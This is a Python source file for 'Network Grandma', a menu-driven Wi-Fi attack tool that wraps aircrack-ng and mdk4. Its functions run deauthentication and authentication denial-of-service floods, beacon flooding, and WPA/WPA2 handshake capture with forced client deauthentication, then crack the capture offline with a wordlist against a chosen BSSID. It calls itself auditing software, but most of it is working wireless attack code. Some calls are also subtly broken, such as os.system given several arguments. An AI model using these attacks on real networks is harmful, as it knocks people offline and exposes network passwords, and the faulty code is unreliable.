#--------------------------------------------------------------------------------------------------------------------------------
#   ███    ██ ███████ ████████ ██     ██  ██████  ██████  ██   ██      ██████  ██████   █████  ███    ██ ██████  ███    ███  █████  
#   ████   ██ ██         ██    ██     ██ ██    ██ ██   ██ ██  ██      ██       ██   ██ ██   ██ ████   ██ ██   ██ ████  ████ ██   ██ 
#   ██ ██  ██ █████      ██    ██  █  ██ ██    ██ ██████  █████       ██   ███ ██████  ███████ ██ ██  ██ ██   ██ ██ ████ ██ ███████ 
#   ██  ██ ██ ██         ██    ██ ███ ██ ██    ██ ██   ██ ██  ██      ██    ██ ██   ██ ██   ██ ██  ██ ██ ██   ██ ██  ██  ██ ██   ██ 
#   ██   ████ ███████    ██     ███ ███   ██████  ██   ██ ██   ██      ██████  ██   ██ ██   ██ ██   ████ ██████  ██      ██ ██   ██ 
#--------------------------------------------------------------------------------------------------------------------------------
#                  Network Grandma
#                Written by Tenor-Z
#                  Tyler Bifolchi
#--------------------------------------------------------------------------------------------------------------------------------
                                                                                                                                
                                                                                                                                
from threading import Thread
import time                     #Use this module to give some rest breaks in between some segments
import os
import sys
import random
import os.path
import subprocess
import psutil                       #Mostly used for killing processes


current_pid = os.getpid()                           #Get the process ID of the program
parent = psutil.Process(current_pid)                    #Group it as a parent


splashtext = ['                                 Auditing so easy, your grandmother could do it.', '                               Skiddies grew up listening to us, they still do', '                                             When the music gets too loud...', '                                         If all else fails... brute force!', '                               Forget crossword puzzles, beacon flooding is where its at!', "                                            Don't forget to bring a towel!", '                                          Radio frequency enema number one', '                                    I await for the almighty Professor Preet!', "                                               Don't get your yarn tangled up!", "                                Automation so fresh, you'll forget what's in the oven!", '                                             Look ma, no Airgeddon.', '                                      As if auditing could not get any lazier.', '                                            My only purpose is to serve you.', '                                              Like fresh baked cookies.', '                                      Ogres are like OSI onions; they have layers.', '                                         I have granted kids to WPA WLANs.', '                                         Oh my god! They killed my network! You b*stard!', '                                 Stops ALFA adapters from tripping on their shoelaces.', '                                               Hello to the CSI club.', '                        Shoutouts to Willow, River and Zephyr. Love you guys to the moon and back!']


#---------------------------------------
#This function will scan this program for
#child processes and kill them when this
#function is called
#----------------------------------------

def child_killer():
    for child in parent.children(recursive=True):  #For each child process in this program
        child.kill()


#----------------------------------------
#This function is used to scan if certain
#packages are installed. If they are not
#installed, the program will still continue
#to run, but will be limited in functionality
#-----------------------------------------

def query_package(path):
    if os.path.exists(path):
        print(str(path) + ' is ready to use')
    else:
        print((path), 'is not installed. This application may not run correctly.')


#-------------------------------------------
#monitormode will set the provided interface
#to monitor mode using ifconfig. This only
#works on interfaces that support monitor mode
#i.e, wlan0
#-------------------------------------------

def monitormode():
    try:
        refresh()
        print("===============================================")
        print("           Monitor Mode Configuration")
        print("===============================================")
        print("NOTE: This only works on interfaces that support")
        print("monitor mode and/or packet injection")
        print("===============================================")
        print("Press CTRL+C at any time to stop the process and")
        print("return to the menu")
        print("===============================================")
        print()
        interface = input("Please enter your interface here> ")

        os.system("ifconfig " + interface + " down")
        os.system("airmon-ng check kill")
        os.system("iwconfig " + interface + " mode monitor")
        os.system("ifconfig " + interface + " up")
        print()
        print("===============================================================")
        print("Done!")
        print("If there are any errors, the wrong interface may have been selected.")
        print("Always ensure that your interface supports monitor mode.")
        print("===============================================================")
        print("Returning to the menu...")
        time.sleep(5)
        menu()

    except KeyboardInterrupt:                   #Just cause people use CTRL+C to exit out of Python programs, why not redirect to the menu
        pass
        menu()


#-----------------------------------------------------
#lockchannel forces an interface to run on a specific
#channel. This allows for said interface to scan 
#APs and perform attacks under a specific channel.
#-----------------------------------------------------

def lockchannel():
    try:
        refresh()
        print("===============================================")
        print("           Monitor Mode Configuration")
        print("===============================================")
        print("NOTE: This only works on interfaces that support")
        print("monitor mode and/or packet injection")
        print("===============================================")
        print("Press CTRL+C at any time to stop the process and")
        print("return to the menu")
        print("===============================================")
        print()
        interface = input("Please enter your interface here> ")
        channel = input("Please input your desired channel> ")
        os.system("iwconfig", interface, "channel", channel)
        print()
        print("===============================================================")
        print("Done!")
        print("If there are any errors, the wrong channel may have been selected.")
        print("Always ensure that you are on the same channel as your target.")
        print("===============================================================")
        print("Returning to the menu...")
        time.sleep(5)
        menu()

    except KeyboardInterrupt:
        pass
        menu()



#----------------------------------------------------------------------
#layer1 performs a Layer 1 DOS attack by creating custom ESSIDs and abusing
#the advertising of beacons. The outcome is that the victim will see multiple
#networks of the provided ESSID name
#------------------------------------------------------------------------

def layer1():
    try:
        print("===============================================")
        print("          Layer 1 Denial of Service")
        print("===============================================")
        print("NOTE: This only works on interfaces that support")
        print("monitor mode and/or packet injection")
        print("===============================================")
        print("Press CTRL+C at any time to stop the process and")
        print("return to the menu")
        print("===============================================")
        print()
        interface = input("Please enter your monsitor mode interface here> ")
        essid = input("Please enter the ESSID (target frequency band)> ")
        layer1 = subprocess.run(["mdk4", interface, "b", "-n", essid])

    except KeyboardInterrupt:
        pass
        child_killer()          #Kill all processes to ensure that the attack properly ceases
        menu()


#-----------------------------------------------------
#deauthdos will perform a deauthentication Denial of
#Service on the selected AP. The user can specify how
#many packets they wish to send.
#-----------------------------------------------------

def deauthdos():
    try:
        refresh()
        print("================================================")
        print("       Deauthentication Denial of Service")
        print("================================================")
        print("NOTE: This only works on interfaces that support")
        print("monitor mode and/or packet injection")
        print("================================================")
        print("Press CTRL+C at any time to stop the attack and") 
        print("return to the menu.")
        print()
        interface = input("Please enter your monitor mode interface here> ")
        deauthpacket = input("Please enter the number of deauthentication packets you wish to send (Type 0 for a continuous attack)> ")
        bssid = input("Please specify your target BSSID> ")
        deauth = subprocess.run(["aireplay-ng", "--deauth", deauthpacket, "-a", bssid, interface])

    except KeyboardInterrupt:
        pass
        child_killer()          #Stop the attack for good
        menu()


#----------------------------------------------------
#networkscan tells airodump-ng to scan for the nearby
#access points. Very straightforward.
#----------------------------------------------------

def networkscan():
    try:
        refresh()
        print("================================================")
        print("            Nearby Network Scan                ")
        print("================================================")
        print("NOTE: This only works on interfaces that support")
        print("monitor mode and/or packet injection")
        print("================================================")
        print("Press CTRL+C at any time to stop the process and")
        print("return to the menu")
        print()
        interface = input("Please enter your monitor mode interface here> ")
        print("Loading up Airodump-ng....")
        print("Please stand by...")
        scan = subprocess.run(['airodump-ng', interface])

    except KeyboardInterrupt:
        pass
        child_killer()
        menu()


#--------------------------------------------------------------
#handshake performs a four way handshake capture by recording
#network traffic via aircrack and sending deauthentication
#packets to speed up the process. The user can connect a client
#to the AP or deauthenticate a connected client to speed up the
#process and capture the handshake
#--------------------------------------------------------------

def handshake():
   try:
    refresh()
    print("================================================")
    print("       Capturing WPA/WPA2 Four-Way Handshake    ")
    print("================================================")
    print("NOTE: This only works on interfaces that support")
    print("monitor mode and/or packet injection")
    print("================================================")
    print("Press CTRL+C at any time to stop the process and")
    print("return to the menu")
    print()
    interface = input("Please enter your monitor mode interface here> ")
    bssid = input("Please enter the BSSID of your target> ")
    channel = input("Please enter the channel number of your target> ")
    filewrite = input("Please enter the name of the capture file you want to save to> ")
    refresh()
    print("Starting the attempt....")
    print("Please stand by...")
    print("TIP: To speed up the handshake process, either connect a client to the AP or deauthenticate it.")
    time.sleep(3)
    scan = subprocess.run(['airodump-ng', '--bssid', bssid, '--channel', channel, '--write', filewrite, interface])
    deauth = subprocess.run(["aireplay-ng", "--deauth", 7, "-a", bssid, interface]) #Time to speed up!

   except KeyboardInterrupt:
       pass
       child_killer()
       menu()


#----------------------------------------------------------------
#beaconflood performs a beacon flood attack where we flood the 
#nearby area with beacon advertisements to arbitrary networks.
#The user can run this on a specific channel to ensure population
#-----------------------------------------------------------------

def beaconflood():
    try:
        refresh()
        print("===========================================")
        print("           Beacon Flood Attack")
        print("===========================================")
        print("NOTE: This only works on interfaces that support")
        print("monitor mode and/or packet injection")
        print("================================================")
        print("Press CTRL+C at any time to stop the process and")
        print("return to the menu")
        print()
        interface = input("Please enter your monsitor mode interface here> ")
        channel = input("Please enter the channel to beacon flood> ")
        flood = subprocess.run(['mdk4', interface, 'b', '-c', channel])

    except KeyboardInterrupt:
        pass
        child_killer()
        menu()


#----------------------------------------------------------
#cracking performs an offline handshake cracking with a cracked
#file and a wordlist. The speed of capture relies on the device's
#processor
#-------------------------------------------------------------

def cracking():
    try:
        refresh()
        print("================================================")
        print("       Cracking WPA/WPA2 capture file           ")
        print("================================================")
        print("================================================")
        print("Press CTRL+C at any time to stop the process and")
        print("return to the menu")
        print()
        wordlist = input("Please enter the full path to your wordlist here> ")
        cap_file = input("Please enter the full path of the capture (.cap) file> ")
        crackin = subprocess.run(['aircrack-ng', cap_file, '-w', wordlist])

    except KeyboardInterrupt:
        pass
        child_killer()
        menu()

#---------------------------------------------------------------
#authdos will perform an Authentication DoS attack by sending
#auth packets instead of deauth
#----------------------------------------------------------------

def authdos():
    try:
        print("================================================")
        print("       Authentication Denial of Service         ")
        print("================================================")
        print("NOTE: This only works on interfaces that support")
        print("monitor mode and/or packet injection")
        print("================================================")
        print("Press CTRL+C at any time to stop the process and")
        print("return to the menu")
        print()
        interface = input("Please enter your monitor mode interface here> ")
        bssid = input("Please enter the BSSID of your target> ")
        authflood = subprocess.run(['mdk4', interface, 'a', '-a', bssid])

    except KeyboardInterrupt:
        pass
        child_killer()
        menu()



def main():
	refresh()
	print("Please wait... Confirming if necessary tools are installed...")
	print()
	time.sleep(3)
	query_package("/usr/bin/aircrack-ng")           #These tools are essential
	query_package("/usr/sbin/mdk4")
	time.sleep(5)
	menu()



def menu():
    try:
        refresh()
        #print(ifaces)              #debugging stuff

        banner = ("""

        
        ██████████████████████████████████████████████████████▀█████████████████████████████████████████
        █▄─▀█▄─▄█▄─▄▄─█─▄─▄─█▄─█▀▀▀█─▄█─▄▄─█▄─▄▄▀█▄─█─▄███─▄▄▄▄█▄─▄▄▀██▀▄─██▄─▀█▄─▄█▄─▄▄▀█▄─▀█▀─▄██▀▄─██
        ██─█▄▀─███─▄█▀███─████─█─█─█─██─██─██─▄─▄██─▄▀████─██▄─██─▄─▄██─▀─███─█▄▀─███─██─██─█▄█─███─▀─██
        ▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▀▄▄▄▀▄▄▄▀▀▄▄▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀▀▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▀▀▄▄▄▀▄▄▄▀▄▄▀▄▄▀
        -----------------------------------------------------------------------------------------------
                                          Written by Tyler Bifolchi (Tenor-Z)
                                                December 6, 2023
        -----------------------------------------------------------------------------------------------
        """)
        print(banner)
        quote = random.choice(splashtext)
        splashin = str(quote.center(20,">"))
        print (splashin)
        print("""
        ----------------------------------------------------------------------------------------------""")          
        selected = input("""                 
        1. Turn on Monitor Mode
        2. Scan for Nearby Networks
        3. Get WPA/WPA2 handshake
        4. Crack WPA/WPA2 passkey
        5. Layer 2 Authentication DoS
        6. Layer 2 Deauthentication DoS
        7. Layer 2 Beacon flood
        8. Custom Layer 1 DoS
        9. Lock Interface to Specific Channel
        0. Exit NetworkGrandma
                     
        Make your selection now:  """)
    
        if selected == "1":
            monitormode()
        elif selected == "2":
            networkscan()
        elif selected == "3":
            handshake()
        elif selected == "4":
            cracking()
        elif selected == "5":
            authdos()
        elif selected == "6":
            deauthdos()
        elif selected == "7":
            beaconflood()
        elif selected == "8":
            layer1()
        elif selected == "9":
            lockchannel()
        elif selected == "0":
            print()
            print("Affirmative!")
            print("See you soon, granny!")
            print("Killing child processes....")
            child_killer()
            time.sleep(2)
            refresh()
            exit()
        else:
            print("Incorrect input!")
            menu()

    except KeyboardInterrupt:
        pass
        print("To exit the application, use the EXIT option.")
        time.sleep(2)
        menu()


#---------------------------------------
#Simple screen refresh function to keep
#things tidy
#---------------------------------------

def refresh():
    platforms = {
        'linux1' : 'Linux',             #Most of these are OS-exclusive commands
        'linux2' : 'Linux',
        'kali' : 'Linux',
        'darwin' : 'OS X',
        'win32' : 'Windows'
    }                                 
 
    if sys.platform == "linux1" or sys.platform == "linux2":
        os.system("clear")
    elif sys.platform == "win32":
        os.system("cls")
    else:
        os.system("clear")

main()
    

